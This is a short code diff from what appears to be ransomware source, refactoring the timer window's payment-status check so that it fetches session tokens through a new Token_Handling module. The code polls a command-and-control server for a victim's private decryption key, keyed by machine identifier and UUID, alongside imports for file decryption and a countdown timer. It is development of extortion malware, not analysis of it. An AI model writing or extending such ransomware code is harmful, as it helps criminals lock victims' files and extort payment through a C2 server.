@@ -7,9 +7,8 @@ import multiprocessing
 import requests
 from datetime import datetime, timedelta
 from Decrypt import decrypt_all_files
-from RSA_Key_Handling import get_machine_identifier
-from Session_Handling import read_session_token, read_unique_uuid
-from Variables import script_files, seconds_left, password, timer_file_name, c2_server, api_key, wrong_api_key
+from Token_Handling import token_check
+from Variables import script_files, seconds_left, password, timer_file_name, c2_server
 
 ####################################################################################################################
 
@@ -66,17 +65,8 @@ def timer_window():
         save_timer_data(start_time, expiration_time)
 
     def check_payment_status():
-        unique_id = get_machine_identifier()
-        session_token = read_session_token()
-        unique_uuid = read_unique_uuid()
-        if session_token and unique_uuid:
-            headers = {
-            'API-KEY': api_key,
-            'Session-Token' : session_token,
-            'uuid' : unique_uuid
-            }
-        else:
-            print("No session token or uuid") # Debug Message
+        headers, renamed_key, unique_id, unique_uuid = token_check()
+
         try:
             response = requests.get(c2_server + f"/payment_status/{unique_id}_{unique_uuid}_private.pem", headers=headers)
             if response.status_code == 200:
